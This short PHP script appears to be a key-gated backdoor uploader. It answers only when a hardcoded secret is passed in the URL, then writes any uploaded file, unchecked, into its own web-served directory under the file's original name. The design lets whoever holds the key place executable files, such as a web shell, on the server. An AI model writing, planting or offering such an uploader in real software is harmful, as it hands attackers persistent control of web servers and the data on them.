<?php
// --- Protection with secret key ---
$secret = "CsZZtmLmkuNmaQgnradtuF"; // change this to your own key
if (!isset($_GET['key']) || $_GET['key'] !== $secret) {
    exit("Access denied!");
}

// --- File upload process ---
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $file = basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
        echo " successful!";
    } else {
        echo " failed!";
    }
}
?>

<!-- Upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>
